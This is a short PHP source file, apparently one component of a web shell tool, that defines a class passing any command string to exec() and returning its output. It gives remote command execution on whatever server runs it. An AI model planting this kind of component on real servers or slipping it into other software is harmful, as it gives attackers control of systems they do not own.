<?php
namespace WebShell;

class ExecExecutionMethod implements ExecutionMethod
{
    public function execute($cmd)
    {
        $output = [];
        exec($cmd, $output);
        return implode("\n", $output);
    }
}
?>
